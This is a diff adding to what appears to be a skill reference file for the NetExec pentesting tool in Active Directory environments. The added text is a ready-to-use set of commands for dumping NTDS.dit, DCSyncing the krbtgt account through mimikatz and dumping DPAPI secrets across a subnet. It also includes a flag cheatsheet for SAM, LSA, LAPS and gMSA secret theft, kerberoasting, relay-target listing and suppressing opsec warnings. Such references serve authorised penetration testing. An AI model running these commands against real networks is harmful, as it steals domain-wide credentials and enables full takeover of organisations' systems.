+### With Domain Admin
+```bash
+# 1. Dump NTDS.dit
+nxc smb <dc_ip> -u DomainAdmin -p 'Pass' --ntds
+
+# 2. DCSync specific user
+nxc smb <dc_ip> -u DomainAdmin -p 'Pass' -M mimikatz -o COMMAND='"lsadump::dcsync /domain:corp.local /user:krbtgt"'
+
+# 3. Dump all DPAPI secrets at scale
+nxc smb 192.168.1.0/24 -u DomainAdmin -p 'Pass' --dpapi nosystem
+```
+
+### Known exemplars
+
 - Lateral movement via local-admin password reuse on Win10/Win11 endpoints — most common pattern in 2023-2024 internal pentests
 - NetExec used in ~80% of OSCP-style Windows engagements (post-2024)
 - Pennyw0rth fork maintains compatibility w/ CME workflows + adds active maintenance + new modules
+
+---
+
+## Quick Reference: Flag Cheatsheet
+
+| Flag | Purpose |
+|------|---------|
+| `-u` | Username(s) or file |
+| `-p` | Password(s) or file |
+| `-H` | NTLM hash |
+| `-k` | Kerberos auth |
+| `--use-kcache` | Use KRB5CCNAME ticket |
+| `--local-auth` | Local user (not domain) |
+| `--id` | Use cred ID from DB |
+| `-x` | Run CMD command |
+| `-X` | Run PowerShell command |
+| `--exec-method` | Force wmiexec/atexec/smbexec |
+| `-M` | Module name (repeatable) |
+| `-o` | Module options KEY=value |
+| `-L` | List available modules |
+| `--sam` | Dump SAM hashes |
+| `--lsa` | Dump LSA secrets |
+| `--ntds` | Dump NTDS.dit |
+| `--dpapi` | Dump DPAPI secrets |
+| `--shares` | Enumerate SMB shares |
+| `--users` | Enumerate users |
+| `--pass-pol` | Get domain password policy |
+| `--loggedon-users` | List logged-on users |
+| `--spider` | Spider a share |
+| `--laps` | Read LAPS password |
+| `--asreproast` | ASREPRoast to file |
+| `--kerberoasting` | Kerberoast to file |
+| `--bloodhound` | Run BloodHound collector |
+| `--find-delegation` | Find delegation misconfigs |
+| `--no-bruteforce` | Pair user[i]:pass[i] mode |
+| `--continue-on-success` | Don't stop at first valid |
+| `--jitter` | Delay between requests |
+| `--gen-relay-list` | Output relay-able hosts |
+| `--delegate` | RBCD/S4U2Self impersonation |
+| `--gmsa` | Dump gMSA passwords |
+| `--ignore-opsec-warnings` | Suppress opsec warnings |
+
+## Cross-references
+
+- Upstream: https://github.com/Pennyw0rth/NetExec
+- Raptix AD overview: `/skills/standard/ad/ad-attack-methodology/SKILL.md`
+- BloodHound: `/skills/standard/ad/bloodhound/SKILL.md`
+- Kerberoast: `/skills/standard/ad/kerberoasting/SKILL.md`
+- ADCS ESC1-15: `/skills/standard/ad/adcs-abuse/SKILL.md`
+- NTLM relay: `/skills/standard/ad/ntlm-relay/SKILL.md`
